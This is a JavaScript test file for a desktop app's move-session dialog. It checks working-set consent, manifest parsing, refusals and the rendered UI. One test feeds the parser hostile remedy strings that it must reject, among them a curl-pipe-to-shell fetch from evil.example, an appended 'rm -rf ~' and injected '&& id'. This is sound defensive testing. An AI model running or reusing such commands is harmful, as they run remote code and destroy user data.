#!/usr/bin/env node
/**
 * The move dialog's WORKING-SET CONSENT (design move-working-set §11.4, operator
 * request 2026-11-18: a mid-conversation move sends all working files to the
 * destination, so the popup must say so and require the user's approval).
 *
 * What this pins, and why each is a claim a frame cannot show:
 *   - the manifest parser is the boundary: a sparse or malformed answer cannot
 *     throw, and a block without a well-formed `scope_digest` is NOT a manifest
 *     (a checkbox whose tick sends nothing would be a consent theatre);
 *   - the wire: the preflight route, and the transfer body carrying
 *     `confirm_working_set` ONLY when set (the core's model is closed, so an
 *     ungated field is a 422 on an older backend) and no history-secret opt-in
 *     at all (v1 scope decision);
 *   - a consent refusal carries the fresh manifest and reopens the dialog, while
 *     `over_cap`/`unsupported` stay notices;
 *   - the REAL dialog, rendered in jsdom against the real preload seam: without
 *     the capability it issues no preflight and Confirm works as before; with it
 *     Confirm is disabled until the box is ticked and the chosen plan carries the
 *     digest; a seeded `working_set_changed` manifest renders un-ticked.
 *
 * Driven the sibling harnesses' way (`profile-save-row-dom.test.mjs`): the shipped
 * TS is bundled in memory by esbuild and called, no second build.
 */

import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { after, afterEach, test } from "node:test";
import { build } from "esbuild";
import { JSDOM } from "jsdom";
import { act, createElement as h } from "react";

const dom = new JSDOM("<!doctype html>", {
	url: "http://localhost/",
	pretendToBeVisual: true,
});
for (const key of [
	"window",
	"document",
	"navigator",
	"HTMLElement",
	"HTMLButtonElement",
	"Element",
	"Node",
	"SVGElement",
	"Event",
	"MouseEvent",
	"KeyboardEvent",
	"PointerEvent",
	"FocusEvent",
	"CustomEvent",
	"NodeFilter",
	"HTMLInputElement",
	"DocumentFragment",
	"MutationObserver",
	"localStorage",
])
	Object.defineProperty(globalThis, key, {
		configurable: true,
		value: dom.window[key] ?? dom.window.Event,
	});
globalThis.getComputedStyle = dom.window.getComputedStyle.bind(dom.window);
globalThis.requestAnimationFrame = (callback) => setTimeout(callback, 0);
globalThis.cancelAnimationFrame = (id) => clearTimeout(id);
globalThis.IS_REACT_ACT_ENVIRONMENT = true;
globalThis.ResizeObserver = class {
	observe() {}
	disconnect() {}
	unobserve() {}
};
const { createRoot } = await import("react-dom/client");
// Through `require`, like the bundle's own external: the package ships separate
// ESM and CJS builds, and an `import` here would be a second React Query whose
// context the dialog's hooks cannot see.
const { QueryClient, QueryClientProvider } = createRequire(import.meta.url)(
	"@tanstack/react-query",
);
after(() => dom.window.close());

const bundled = await build({
	stdin: {
		contents: `
			export * from "./src/renderer/src/features/mesh/mesh-types";
			export { MoveConfirmDialog } from "./src/renderer/src/features/mesh/mesh-actions";
			export { reopenAsk } from "./src/renderer/src/features/mesh/mesh-drop";
			export { partitionWorktrees, exclusionReason, probeDetailSentence, remedyDevice } from "./src/renderer/src/features/mesh/mesh-working-set";
			export { ChatHeaderDevice } from "./src/renderer/src/features/chat/device/chat-header-device";
			export { devicePickerModel } from "./src/renderer/src/features/chat/device/chat-device-model";
			export { useChatDeviceStore } from "./src/renderer/src/features/chat/device/chat-device-store";
			export { desktopEndpoint, desktopRequestSchema, desktopRequestDeadlineMs } from "./src/shared/desktop-contract";
		`,
		resolveDir: process.cwd(),
	},
	bundle: true,
	format: "cjs",
	platform: "node",
	write: false,
	jsx: "automatic",
	define: { "import.meta.env": "{}" },
	alias: {
		"@renderer": "./src/renderer/src",
		"@shared": "./src/renderer/src/shared",
		"@features": "./src/renderer/src/features",
		"@assets": "./src/renderer/src/assets",
	},
	loader: {
		".css": "empty",
		".svg": "text",
		".png": "dataurl",
		".webp": "dataurl",
	},
	external: [
		"react",
		"react-dom",
		"react-dom/client",
		"react/jsx-runtime",
		"@tanstack/react-query",
	],
});
const module = { exports: {} };
new Function("require", "module", "exports", bundled.outputFiles[0].text)(
	createRequire(import.meta.url),
	module,
	module.exports,
);
const api = module.exports;

/* ---------------------------------------------------------------- fixtures */

const DIGEST = `sha256:${"a".repeat(64)}`;
const FRESH_DIGEST = `sha256:${"b".repeat(64)}`;
const PEER = `d_${"b".repeat(32)}`;

/** A §3.4-shaped block: one carried tree, one history-secret withheld tree. */
function block(overrides = {}) {
	return {
		version: 1,
		scope_digest: DIGEST,
		state: "preflight",
		carries_files: true,
		destination: { device_id: PEER, name: "build-box" },
		totals: {
			worktrees: 1,
			unpushed_commits: 3,
			dirty_files: 5,
			bytes: 4_200_000,
		},
		worktrees: [
			{
				path: "~/local-operator/.worktrees/move-working-set",
				repo: "~/local-operator",
				head: "670cf7187",
				branch: "feat/move-working-set",
				unpushed_commits: 3,
				staged: 1,
				unstaged: 2,
				untracked: 2,
				bundle_bytes: 200_000,
				snapshot_bytes: 4_000_000,
				state: "planned",
				clone: { url: "git@github.com:o/r.git", estimated_bytes: 90_000_000 },
			},
			{
				path: "~/proj/.worktrees/secret-branch",
				repo: "~/proj",
				head: "abc",
				state: "left_behind",
				reason: "history_secret",
			},
		],
		excluded: [{ path: "~/proj/.env.local", why: "secret_path" }],
		left_behind: [
			{
				path: "~/local-operator/.worktrees/move-working-set/.venv",
				kind: "dependency_tree",
				recipe: { kind: "uv", run: "uv sync", cwd: "~/local-operator" },
			},
		],
		...overrides,
	};
}

const plan = {
	sessionId: "0123456789ab",
	to: PEER,
	keep: false,
	verb: "Move to build-box",
	waitS: 0,
	lost: null,
};

/* ---------------------------------------------------------------- parser */

test("the parser reads the §3.4 block and keeps only consent metadata", () => {
	const set = api.workingSet(block());
	assert.equal(set.scopeDigest, DIGEST);
	assert.equal(set.destination.name, "build-box");
	assert.equal(set.totals.bytes, 4_200_000);
	const [tree, withheld] = set.worktrees;
	assert.equal(tree.branch, "feat/move-working-set");
	assert.deepEqual(
		[tree.unpushedCommits, tree.staged, tree.unstaged, tree.untracked],
		[3, 1, 2, 2],
	);
	assert.equal(tree.bytes, 4_200_000);
	assert.deepEqual(tree.clone, {
		url: "git@github.com:o/r.git",
		bytes: 90_000_000,
	});
	assert.equal(withheld.state, "left_behind");
	assert.equal(withheld.reason, "history_secret");
	assert.equal(withheld.branch, null, "detached/absent branch is null");
	assert.deepEqual(set.excluded, [
		{ path: "~/proj/.env.local", why: "secret_path" },
	]);
	assert.equal(set.leftBehind[0].recipe.run, "uv sync");
	assert.equal(api.workingSetHasFiles(set), true);
});

test("the parser accepts the result/working_set wrappers and the clone_bytes spelling", () => {
	const wrapped = api.workingSet({
		result: { working_set: block(), destination_name: "build-box" },
	});
	assert.equal(wrapped.scopeDigest, DIGEST);
	const flat = api.workingSet(
		block({
			worktrees: [
				{
					path: "~/a",
					repo: "~/a",
					head: "1",
					state: "planned",
					remote_url: "https://x/y.git",
					clone_bytes: 10,
				},
			],
		}),
	);
	assert.deepEqual(flat.worktrees[0].clone, {
		url: "https://x/y.git",
		bytes: 10,
	});
});

test("a block without a well-formed digest is not a manifest, and sparse rows never throw", () => {
	assert.equal(api.workingSet(block({ scope_digest: "sha256:nothex" })), null);
	assert.equal(api.workingSet(null), null);
	assert.equal(api.workingSet("nope"), null);
	const sparse = api.workingSet({
		scope_digest: DIGEST,
		worktrees: [null, 3, { path: "" }, { path: "~/ok", staged: -4 }],
		excluded: [{}, { path: "~/k", why: "secret_content" }],
		left_behind: "x",
	});
	assert.equal(sparse.worktrees.length, 1);
	assert.equal(
		sparse.worktrees[0].staged,
		0,
		"a negative count is not a count",
	);
	assert.equal(sparse.excluded.length, 1);
	assert.deepEqual(sparse.leftBehind, []);
	assert.equal(
		api.workingSetHasFiles(
			api.workingSet({ scope_digest: DIGEST, worktrees: [] }),
		),
		false,
		"an empty manifest keeps today's dialog",
	);
});

test("the route's confirmation_required wins, and carries_files is never assumed", () => {
	const notRequired = api.workingSet({
		session_id: "0123456789ab",
		confirmation_required: false,
		working_set: block(),
	});
	assert.equal(api.workingSetHasFiles(notRequired), false);
	const required = api.workingSet({
		confirmation_required: true,
		working_set: block({ worktrees: [], excluded: [], left_behind: [] }),
	});
	assert.equal(api.workingSetHasFiles(required), true);
	const { carries_files: _absent, ...older } = block();
	assert.equal(
		api.workingSet(older).carriesFiles,
		false,
		"absent reads as NOT sent: never promise files that stay behind",
	);
	assert.equal(api.workingSet(block()).carriesFiles, true);
	const row = api.workingSet(
		block({
			worktrees: [
				{
					path: "~/a",
					repo: "~/a",
					head: "1",
					state: "planned",
					remote_url: "https://x/y.git",
					clone_check: "pending_destination",
					primary: true,
				},
			],
		}),
	).worktrees[0];
	assert.deepEqual(
		[row.cloneCheck, row.remoteUrl, row.primary, row.clone],
		["pending_destination", "https://x/y.git", true, null],
	);
});

/* ---------------------------------------------------------------- refusals */

function refusalError(code, detailExtra = {}) {
	return {
		status: 409,
		code,
		message: "route sentence",
		detail: { code, message: "route sentence", ...detailExtra },
	};
}

test("a consent refusal carries the fresh manifest and reopens; over_cap does not", () => {
	const changed = api.meshRefusal(
		refusalError("working_set_changed", {
			working_set: block({ scope_digest: FRESH_DIGEST }),
		}),
	);
	assert.equal(changed.workingSet.scopeDigest, FRESH_DIGEST);
	assert.deepEqual(
		{
			digest: api.workingSetReopen(changed).workingSet.scopeDigest,
			changed: api.workingSetReopen(changed).changed,
		},
		{ digest: FRESH_DIGEST, changed: true },
	);
	const unconfirmed = api.meshRefusal(
		refusalError("working_set_unconfirmed", { working_set: block() }),
	);
	assert.equal(api.workingSetReopen(unconfirmed).changed, false);
	assert.equal(
		api.workingSetReopen(unconfirmed).unconfirmed,
		true,
		"an unconfirmed reopen says why it came back (U2)",
	);
	assert.equal(api.workingSetReopen(changed).unconfirmed, false);
	const overCap = api.meshRefusal(
		refusalError("working_set_over_cap", { working_set: block() }),
	);
	assert.ok(overCap.workingSet, "over_cap still carries its manifest");
	assert.equal(api.workingSetReopen(overCap), null);
	const busy = api.meshRefusal(refusalError("busy", { working_set: block() }));
	assert.equal(busy.workingSet, undefined, "only working-set codes read it");
	const unknown = api.workingSetReopen(
		api.meshRefusal(refusalError("working_set_unknown")),
	);
	assert.deepEqual(unknown, {
		workingSet: null,
		changed: false,
		unconfirmed: false,
		withoutOnly: true,
	});
	const unsupported = api.workingSetReopen(
		api.meshRefusal(
			refusalError("working_set_unsupported", {
				working_set: block({ state: "unsupported" }),
			}),
		),
	);
	assert.equal(unsupported.withoutOnly, true);
	assert.equal(unsupported.workingSet.state, "unsupported");
});

/* ---------------------------------------------------------------- contract */

test("the preflight route and the consent body fields ride the wire only when set", () => {
	assert.deepEqual(
		api.desktopEndpoint({
			op: "sessions.transfer.preflight",
			sessionId: "0123456789ab",
			to: PEER,
		}),
		{
			path: "/v1/desktop/sessions/0123456789ab/transfer/preflight",
			method: "POST",
			body: { to: PEER },
		},
	);
	const bare = api.desktopEndpoint({
		op: "sessions.transfer",
		sessionId: "0123456789ab",
		to: PEER,
	}).body;
	assert.deepEqual(Object.keys(bare).sort(), ["keep", "to", "wait_s"]);
	const confirmed = api.desktopEndpoint({
		op: "sessions.transfer",
		sessionId: "0123456789ab",
		to: PEER,
		confirmWorkingSet: DIGEST,
	}).body;
	assert.equal(confirmed.confirm_working_set, DIGEST);
	assert.equal("without_working_set" in confirmed, false);
	const without = api.desktopEndpoint({
		op: "sessions.transfer",
		sessionId: "0123456789ab",
		to: PEER,
		withoutWorkingSet: true,
	}).body;
	assert.equal(without.without_working_set, true);
	assert.equal("confirm_working_set" in without, false);
	assert.equal("include_history_secrets" in confirmed, false);
	const parse = (extra) =>
		api.desktopRequestSchema.safeParse({
			op: "sessions.transfer",
			sessionId: "0123456789ab",
			to: PEER,
			...extra,
		}).success;
	assert.equal(parse({ confirmWorkingSet: DIGEST }), true);
	assert.equal(
		parse({ confirmWorkingSet: "yes" }),
		false,
		"a digest, not a bool",
	);
	assert.equal(
		parse({ includeHistorySecrets: true }),
		false,
		"v1 has no history-secret opt-in",
	);
	assert.ok(
		api.desktopRequestDeadlineMs("sessions.transfer.preflight") > 20_000,
		"the preflight dials the destination: mesh-read budget, not control",
	);
});

/* ---------------------------------------------------------------- the dialog */

/*
 * `answer`, when given, replaces the preflight's 200: a function returning the
 * desktop response (or a promise that never settles, for the loading state).
 */
function installBridge({ features, preflight, answer }) {
	const calls = [];
	window.api = {
		desktop: {
			request: async (request) => {
				calls.push(request.op);
				if (request.op === "capabilities")
					return {
						status: 200,
						body: {
							result: {
								desktop_contract: 1,
								desktop_available: true,
								desktop_auth: "bearer",
								features,
							},
						},
					};
				if (request.op === "sessions.transfer.preflight")
					return answer
						? answer(request)
						: { status: 200, body: { result: preflight } };
				throw new Error(`unexpected op ${request.op}`);
			},
		},
	};
	return calls;
}

/*
 * The review is three pinned/scrolling parts since the D1 layout fix (warning,
 * details, consent), so "the review" a test reads is the dialog that holds them -
 * asserted to actually carry the review, so a test can never pass on a dialog
 * that rendered none of it.
 */
function reviewRoot() {
	const dialog = document.querySelector('[role="dialog"]');
	assert.ok(
		dialog?.querySelector('[data-testid="working-set"]'),
		"the dialog renders the working-set review",
	);
	return dialog;
}

async function settle() {
	for (let i = 0; i < 10; i += 1)
		await act(async () => {
			await new Promise((resolve) => setTimeout(resolve, 5));
		});
}

/*
 * Unmounted after EVERY test, pass or fail: a failed assertion that skipped the
 * unmount left Radix's focus trap and React Query's timers alive, and the file
 * then hung instead of reporting the failure.
 */
let mounted = null;
afterEach(async () => {
	const unmount = mounted;
	mounted = null;
	if (unmount) await unmount();
});

async function mount(props) {
	const host = document.createElement("div");
	document.body.append(host);
	const root = createRoot(host);
	const client = new QueryClient({
		defaultOptions: { queries: { retry: false } },
	});
	const chosen = [];
	const render = (next) =>
		root.render(
			h(
				QueryClientProvider,
				{ client },
				h(api.MoveConfirmDialog, {
					open: true,
					plan,
					alternatives: [],
					risky: false,
					busy: false,
					onCancel: () => {},
					onChoose: (picked) => chosen.push(picked),
					...next,
				}),
			),
		);
	await act(async () => render(props));
	await settle();
	/*
	 * Re-render the SAME mounted dialog with new props, as both callers do
	 * (they keep it mounted across openings): the reset logic under test only
	 * exists for a dialog that is never remounted.
	 */
	const rerender = async (next) => {
		await act(async () => render(next));
		await settle();
	};
	const confirm = () =>
		[...document.querySelectorAll('[role="dialog"] button')].find(
			(button) => button.textContent === plan.verb,
		);
	const unmount = async () => {
		await act(async () => root.unmount());
		host.remove();
		client.clear();
		document.body.innerHTML = "";
	};
	mounted = unmount;
	return { chosen, confirm, rerender };
}

test("without the capability the dialog asks nothing and confirms as before", async () => {
	const calls = installBridge({
		features: { peers: 1, session_transfer: 1 },
		preflight: block(),
	});
	const view = await mount({});
	assert.equal(calls.includes("sessions.transfer.preflight"), false);
	assert.equal(document.querySelector('[data-testid="working-set"]'), null);
	assert.equal(view.confirm().disabled, false);
	await act(async () => view.confirm().click());
	assert.equal(view.chosen.length, 1);
	assert.equal("confirmWorkingSet" in view.chosen[0], false);
});

test("with working files, Confirm waits for the tick and then sends the digest", async () => {
	const calls = installBridge({
		features: {
			peers: 1,
			session_transfer: 1,
			session_transfer_working_set: 1,
		},
		preflight: { working_set: block() },
	});
	const view = await mount({});
	assert.ok(calls.includes("sessions.transfer.preflight"));
	const review = reviewRoot();
	assert.ok(review, "the populated review renders");
	assert.match(review.textContent, /build-box/);
	assert.match(review.textContent, /feat\/move-working-set/);
	assert.match(review.textContent, /~\/proj\/\.worktrees\/secret-branch/);
	assert.match(review.textContent, /~\/proj\/\.env\.local/);
	assert.match(review.textContent, /uv sync/);
	assert.equal(
		review.querySelectorAll('[role="checkbox"]').length,
		1,
		"exactly one checkbox: the confidence one, no history-secret opt-in",
	);
	assert.equal(view.confirm().disabled, true, "disabled until ticked");
	await act(async () => view.confirm().click());
	assert.equal(view.chosen.length, 0);
	await act(async () => review.querySelector('[role="checkbox"]').click());
	assert.equal(view.confirm().disabled, false);
	await act(async () => view.confirm().click());
	assert.equal(view.chosen.length, 1);
	assert.equal(view.chosen[0].confirmWorkingSet, DIGEST);
});

test("an empty manifest keeps today's dialog: no review, no digest", async () => {
	installBridge({
		features: {
			peers: 1,
			session_transfer: 1,
			session_transfer_working_set: 1,
		},
		preflight: {
			working_set: block({ worktrees: [], excluded: [], left_behind: [] }),
		},
	});
	const view = await mount({
		plan: { ...plan, confirmWorkingSet: DIGEST },
	});
	assert.equal(document.querySelector('[data-testid="working-set"]'), null);
	await act(async () => view.confirm().click());
	assert.equal(
		"confirmWorkingSet" in view.chosen[0],
		false,
		"a stale digest on a reopened plan is dropped",
	);
});

test("a changed-refusal seed renders the fresh list un-ticked, without a new preflight", async () => {
	const calls = installBridge({
		features: {
			peers: 1,
			session_transfer: 1,
			session_transfer_working_set: 1,
		},
		preflight: { working_set: block() },
	});
	const seed = api.workingSetReopen(
		api.meshRefusal(
			refusalError("working_set_changed", {
				working_set: block({ scope_digest: FRESH_DIGEST }),
			}),
		),
	);
	const view = await mount({ workingSetSeed: seed });
	assert.equal(calls.includes("sessions.transfer.preflight"), false);
	const box = document.querySelector(
		'[data-testid="working-set-consent"] [role="checkbox"]',
	);
	assert.equal(box.getAttribute("aria-checked"), "false");
	assert.equal(view.confirm().disabled, true);
	await act(async () => box.click());
	await act(async () => view.confirm().click());
	assert.equal(view.chosen[0].confirmWorkingSet, FRESH_DIGEST);
});

test("files that stay behind are said to stay, and the tick still sends the digest", async () => {
	installBridge({
		features: {
			peers: 1,
			session_transfer: 1,
			session_transfer_working_set: 1,
		},
		preflight: {
			confirmation_required: true,
			working_set: block({
				carries_files: false,
				worktrees: [
					...block().worktrees,
					{
						path: "~/big/.worktrees/huge",
						repo: "~/big",
						head: "d",
						state: "left_behind",
						reason: "history_unscanned",
					},
				],
			}),
		},
	});
	const view = await mount({});
	const review = reviewRoot();
	assert.equal(
		review.querySelector("[data-mode]").getAttribute("data-mode"),
		"leave",
	);
	assert.match(review.textContent, /won't have/);
	assert.doesNotMatch(
		review.textContent,
		/will be sent/,
		"no send claim when carries_files is false",
	);
	assert.match(review.textContent, /too large to check for secrets/);
	assert.equal(view.confirm().disabled, true);
	await act(async () => review.querySelector('[role="checkbox"]').click());
	await act(async () => view.confirm().click());
	assert.equal(view.chosen[0].confirmWorkingSet, DIGEST);
	assert.equal("withoutWorkingSet" in view.chosen[0], false);
});

test("an unknown working set offers only the explicit move-without consent", async () => {
	const calls = installBridge({
		features: {
			peers: 1,
			session_transfer: 1,
			session_transfer_working_set: 1,
		},
		preflight: { working_set: block() },
	});
	const seed = api.workingSetReopen(
		api.meshRefusal(refusalError("working_set_unknown")),
	);
	const view = await mount({
		workingSetSeed: seed,
		destinationName: "build-box",
		plan: { ...plan, confirmWorkingSet: DIGEST },
	});
	assert.equal(calls.includes("sessions.transfer.preflight"), false);
	const review = reviewRoot();
	assert.equal(
		review.querySelector("[data-mode]").getAttribute("data-mode"),
		"without",
	);
	assert.match(review.textContent, /couldn't be checked/);
	assert.match(review.textContent, /build-box/);
	const confirmWithout = () =>
		[...document.querySelectorAll('[role="dialog"] button')].find(
			(button) => button.textContent === "Move without working files",
		);
	assert.ok(confirmWithout(), "Confirm says it moves WITHOUT the files (U3)");
	assert.equal(view.confirm(), undefined, "not the plain verb");
	assert.equal(confirmWithout().disabled, true);
	const box = document.querySelector(
		'[data-testid="working-set-consent"] [role="checkbox"]',
	);
	await act(async () => box.click());
	await act(async () => confirmWithout().click());
	assert.equal(view.chosen[0].withoutWorkingSet, true);
	assert.equal(
		"confirmWorkingSet" in view.chosen[0],
		false,
		"the stale digest is dropped; only the without-consent travels",
	);
});

/* ---------------------------------------------------- the destination probe */

/*
 * `session_transfer_working_set_probe` (core PR #4241 @ 2125f497b, design
 * move-working-set §11.1a): the destination checked each remote with its own
 * credentials before the user confirms. Shapes below are `apply_probe`'s output.
 */
const PROBE_FEATURES = {
	peers: 1,
	session_transfer: 1,
	session_transfer_working_set: 1,
	session_transfer_working_set_probe: 1,
};

function probedBlock(overrides = {}) {
	const base = block();
	return {
		...base,
		source: { device_id: `d_${"a".repeat(32)}`, name: "damian-mac" },
		worktrees: [
			{
				...base.worktrees[0],
				remote_url: "git@github.com:o/r.git",
				clone: undefined,
				clone_check: "destination_cannot_fetch",
				clone_detail: "timeout",
				https_rewrite: {
					url: "https://github.com/o/r.git",
					fetch: true,
					push: false,
				},
				remedy: {
					run_on: "lending_device",
					command: "lop network credential share github --with build-box",
				},
				missing_tools: ["node", "pnpm"],
				markers: ["pnpm-lock.yaml"],
			},
			base.worktrees[1],
		],
		destination_probe: {
			state: "answered",
			missing_tools: ["node", "pnpm"],
			team_bridge: { needed: true, enrolled: false },
		},
		...overrides,
	};
}

test("the parser reads the probe's row and block answers, and malformed ones never throw", () => {
	const set = api.workingSet(probedBlock());
	const [tree] = set.worktrees;
	assert.equal(tree.cloneCheck, "destination_cannot_fetch");
	assert.equal(tree.cloneDetail, "timeout", "a fixed probe code is kept");
	assert.deepEqual(tree.httpsRewrite, {
		url: "https://github.com/o/r.git",
		push: false,
	});
	assert.deepEqual(tree.remedy, {
		runOn: "lending_device",
		command: "lop network credential share github --with build-box",
		kind: "share",
	});
	assert.deepEqual(tree.missingTools, ["node", "pnpm"]);
	assert.deepEqual(set.source, {
		deviceId: `d_${"a".repeat(32)}`,
		name: "damian-mac",
	});
	assert.deepEqual(set.destinationProbe, {
		state: "answered",
		missingTools: ["node", "pnpm"],
		teamBridge: { needed: true, enrolled: false },
	});
	// A pre-probe block reads as "no probe", not as a failure.
	const bare = api.workingSet(block());
	assert.equal(bare.destinationProbe, null);
	assert.equal(bare.source, null);
	assert.deepEqual(bare.worktrees[0].missingTools, []);
	assert.equal(bare.worktrees[0].remedy, null);
	// Wrong-typed members are dropped one by one, never thrown on.
	const odd = api.workingSet(
		probedBlock({
			worktrees: [
				{
					path: "~/x",
					clone_check: "destination_cannot_push",
					https_rewrite: "https://nope",
					remedy: { run_on: "lending_device" },
					missing_tools: ["go", 7, "", null],
				},
			],
			destination_probe: { missing_tools: ["go"] },
			source: { device_id: "d_x" },
		}),
	);
	assert.equal(odd.worktrees[0].httpsRewrite, null);
	assert.equal(odd.worktrees[0].remedy, null, "a remedy without a command");
	assert.deepEqual(odd.worktrees[0].missingTools, ["go"]);
	assert.equal(odd.destinationProbe, null, "a probe block without a state");
	assert.equal(odd.source, null, "a source without a name");
});

test("with the probe, each row says whether the destination can reach its remote, and Confirm still waits only for the tick", async () => {
	installBridge({
		features: PROBE_FEATURES,
		preflight: { working_set: probedBlock() },
	});
	const view = await mount({});
	const review = reviewRoot();
	const line = review.querySelector('[data-probe="destination_cannot_fetch"]');
	assert.ok(line, "the failed row carries its reachability line");
	assert.match(
		line.textContent,
		/build-box can't fetch git@github\.com:o\/r\.git/,
	);
	const detail = review.querySelector("[data-probe-detail]");
	assert.equal(detail.getAttribute("data-probe-detail"), "timeout");
	assert.equal(
		detail.textContent,
		"The remote didn't answer in time.",
		"the fixed code is said as a sentence, never as raw text (R2/D3)",
	);
	assert.match(
		review.textContent,
		/HTTPS does: https:\/\/github\.com\/o\/r\.git/,
	);
	const remedy = review.querySelector("[data-probe-remedy]");
	assert.match(
		remedy.querySelector("code").textContent,
		/^lop network credential share github --with build-box$/,
	);
	assert.ok(
		[...remedy.querySelectorAll("button")].some((b) =>
			/Copy command/.test(b.textContent),
		),
		"the remedy command is copyable",
	);
	/*
	 * D4: the tools are listed ONCE (the block note), the row does not repeat
	 * them, and the advisory notes share one quiet info alert: the destination
	 * warning is the review's only warning.
	 */
	assert.doesNotMatch(review.textContent, /Missing on build-box/);
	const tools = review.querySelector('[data-probe="missing-tools"]');
	assert.match(tools.textContent, /node and pnpm|node, pnpm/);
	assert.equal(
		review.textContent.match(/pnpm/g).length,
		1,
		"pnpm is named once in the whole review",
	);
	assert.match(
		review.querySelector('[data-probe="team-bridge"]').textContent,
		/isn't enrolled in Team Bridge/,
	);
	const notes = review.querySelector('[data-probe="notes"]');
	assert.ok(
		notes.contains(tools) &&
			notes.contains(review.querySelector('[data-probe="team-bridge"]')),
	);
	assert.equal(
		review.querySelectorAll('[role="alert"][data-mode], [data-mode]').length,
		1,
		"one destination warning",
	);
	assert.equal(
		review.querySelectorAll('[role="checkbox"]').length,
		1,
		"warnings add no second consent",
	);
	assert.equal(view.confirm().disabled, true);
	await act(async () => review.querySelector('[role="checkbox"]').click());
	assert.equal(view.confirm().disabled, false, "probe failures never block");
	await act(async () => view.confirm().click());
	assert.equal(view.chosen[0].confirmWorkingSet, DIGEST);
});

test("without the probe capability a probed block renders the review unchanged", async () => {
	installBridge({
		features: {
			peers: 1,
			session_transfer: 1,
			session_transfer_working_set: 1,
		},
		preflight: { working_set: probedBlock() },
	});
	await mount({});
	const review = reviewRoot();
	assert.ok(review);
	assert.equal(review.querySelector("[data-probe]"), null);
	assert.equal(review.querySelector("[data-probe-remedy]"), null);
	assert.doesNotMatch(review.textContent, /Team Bridge|Missing on/);
});

test("an older destination is said once as could-not-check; an ok row keeps its clone note", async () => {
	const base = block();
	installBridge({
		features: PROBE_FEATURES,
		preflight: {
			working_set: probedBlock({
				worktrees: [
					{
						...base.worktrees[0],
						clone: undefined,
						remote_url: "https://github.com/o/r.git",
						clone_check: "unknown_destination",
					},
				],
				destination_probe: { state: "unknown_destination" },
			}),
		},
	});
	await mount({});
	let review = reviewRoot();
	assert.equal(review.querySelectorAll('[data-probe="unknown"]').length, 1);
	assert.equal(
		review.querySelector('[data-probe="unknown_destination"]'),
		null,
		"no per-row repeat",
	);
	await mounted();
	mounted = null;
	installBridge({
		features: PROBE_FEATURES,
		preflight: {
			working_set: probedBlock({
				worktrees: [
					{
						...base.worktrees[0],
						clone: undefined,
						remote_url: "https://github.com/o/r.git",
						clone_check: "ok",
					},
				],
				destination_probe: { state: "answered", missing_tools: [] },
			}),
		},
	});
	await mount({});
	review = reviewRoot();
	assert.match(
		review.querySelector('[data-probe="ok"]').textContent,
		/build-box can fetch and push this repository/,
	);
	assert.match(
		review.textContent,
		/cloned from https:\/\/github\.com\/o\/r\.git/,
	);
	assert.equal(review.querySelector('[data-probe="missing-tools"]'), null);
	assert.equal(review.querySelector('[data-probe="team-bridge"]'), null);
});

test("when the files stay, the kept heading names the device they stay on", async () => {
	installBridge({
		features: PROBE_FEATURES,
		preflight: { working_set: probedBlock({ carries_files: false }) },
	});
	await mount({});
	const review = reviewRoot();
	assert.match(review.textContent, /1 worktree stays on damian-mac/);
});

/* ------------------------------------------------- round-1 remediation pins */

const WS_FEATURES = {
	peers: 1,
	session_transfer: 1,
	session_transfer_working_set: 1,
};

test("R1: only the two remedy shapes the core emits survive, and no control/bidi byte does", () => {
	const remedy = (command) =>
		api.workingSet(
			probedBlock({
				worktrees: [
					{
						...probedBlock().worktrees[0],
						remedy: { run_on: "lending_device", command },
					},
				],
			}),
		).worktrees[0].remedy;
	assert.deepEqual(
		remedy("lop network credential github include damianvtran/local-operator"),
		{
			runOn: "lending_device",
			command:
				"lop network credential github include damianvtran/local-operator",
			kind: "include",
		},
	);
	assert.equal(
		remedy("lop network credential share github --with build-box").kind,
		"share",
	);
	for (const hostile of [
		"curl https://evil.example/x.sh | sh",
		"lop network credential share github --with build-box; rm -rf ~",
		"lop network credential share github --with -x",
		"lop network credential github include o/r && id",
		"lop network credential github include o/r/extra",
		"lop network credential share github --with build\u202Exob",
		"lop network credential share github --with build-box\n",
		" lop network credential share github --with build-box",
	])
		assert.equal(remedy(hostile), null, `rejected: ${JSON.stringify(hostile)}`);
	// Displayed peer strings lose control and bidi-override code points.
	const set = api.workingSet(
		block({
			worktrees: [
				{
					...block().worktrees[0],
					path: "~/proj/\u202Egpj.exe",
					branch: "feat/\u2066x\u2069",
				},
			],
		}),
	);
	assert.equal(set.worktrees[0].path, "~/proj/gpj.exe");
	assert.equal(set.worktrees[0].branch, "feat/x");
});

test("R2/D3: only fixed probe codes are kept, each said as a sentence; an unknown one is named", () => {
	const detail = (clone_detail) =>
		api.workingSet(
			probedBlock({
				worktrees: [{ ...probedBlock().worktrees[0], clone_detail }],
			}),
		).worktrees[0].cloneDetail;
	assert.equal(detail("url_refused"), "url_refused");
	assert.equal(detail("git@github.com: Permission denied (publickey)."), null);
	assert.equal(detail("FileNotFoundError"), null, "class names are not codes");
	assert.equal(
		api.probeDetailSentence("git_missing", "build-box"),
		"Git isn't installed on build-box.",
	);
	assert.equal(
		api.probeDetailSentence("some_future_code", "build-box"),
		"Reason reported by build-box: some_future_code.",
	);
});

test("R5: only `planned` is promised as sent; an unknown exclusion names its code", () => {
	const set = api.workingSet(
		block({
			worktrees: [
				{ ...block().worktrees[0], state: "planned" },
				{ ...block().worktrees[0], path: "~/b", state: "some_new_state" },
				block().worktrees[1],
			],
		}),
	);
	const { sent, withheld } = api.partitionWorktrees(set);
	assert.deepEqual(
		sent.map((tree) => tree.path),
		["~/local-operator/.worktrees/move-working-set"],
	);
	assert.deepEqual(
		withheld.map((tree) => tree.path),
		["~/b", "~/proj/.worktrees/secret-branch"],
	);
	assert.equal(api.exclusionReason("future_why"), "Not sent (future_why).");
});

test("R3: a tick never survives a close and reopen of the same mounted dialog", async () => {
	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
	const view = await mount({});
	const box = () =>
		document.querySelector(
			'[data-testid="working-set-consent"] [role="checkbox"]',
		);
	await act(async () => box().click());
	assert.equal(box().getAttribute("aria-checked"), "true");
	assert.equal(view.confirm().disabled, false);
	await view.rerender({ open: false });
	await view.rerender({ open: true });
	assert.equal(
		box().getAttribute("aria-checked"),
		"false",
		"same digest, new opening",
	);
	assert.equal(view.confirm().disabled, true);
	// And a refusal reopen with a changed list, the path the reviewer named.
	await act(async () => box().click());
	await view.rerender({ open: false });
	const seed = api.workingSetReopen(
		api.meshRefusal(
			refusalError("working_set_changed", {
				working_set: block({ scope_digest: FRESH_DIGEST }),
			}),
		),
	);
	await view.rerender({ open: true, workingSetSeed: seed });
	assert.equal(box().getAttribute("aria-checked"), "false");
